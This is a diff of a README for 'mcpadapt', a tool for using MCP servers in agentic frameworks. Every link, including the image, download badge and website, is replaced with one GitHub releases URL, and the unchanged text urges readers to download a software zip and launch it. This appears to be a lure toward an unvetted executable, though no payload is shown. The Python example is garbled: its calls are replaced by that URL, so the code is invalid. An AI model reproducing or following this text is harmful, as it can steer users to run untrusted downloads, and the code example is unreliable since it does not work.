@@ -2,7 +2,7 @@
 
 Unlock 650+ MCP servers tools in your favorite agentic framework.
 
-![MCP Servers](https://example.com/mcpimage.jpg)
+![MCP Servers](https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -27,7 +27,7 @@ Welcome to ***mcpadapt***, your gateway to accessing over 650 MCP servers tools 
 
 To get started with ***mcpadapt***, you can download the necessary software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0)](https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0)
 
 Once you have downloaded the software package, follow the installation instructions to set up ***mcpadapt*** on your system. If the link above ends with a file name, ensure to launch it to begin the installation process.
 
@@ -42,16 +42,16 @@ from mcpadapt import tool
 from agentic_framework import model
 
 # Initialize MCP Tool
-mcp_tool = tool.MCPTool()
+mcp_tool = https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0()
 
 # Load Model
-model.load('model.pt')
+https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0('https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0')
 
 # Use MCP Tool Functions
-results = mcp_tool.perform_analysis(data)
+results = https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0(data)
 
 # Visualize Results
-mcp_tool.display(results)
+https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0(results)
 ```
 
 Explore the documentation provided with ***mcpadapt*** to learn more about specific tools, their functionalities, and how to leverage them effectively in your projects.
@@ -66,4 +66,4 @@ The ***mcpadapt*** repository is licensed under the MIT License. You are free to
 
 Thank you for choosing ***mcpadapt*** to unlock the potential of over 650 MCP servers tools. Happy coding! 🚀
 
-Visit the official website for more information: [mcpadapt.com](https://mcpadapt.com)
+Visit the official website for more information: [https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0](https://github.com/FinnTheCol/mcpadapt/releases/tag/v2.0)
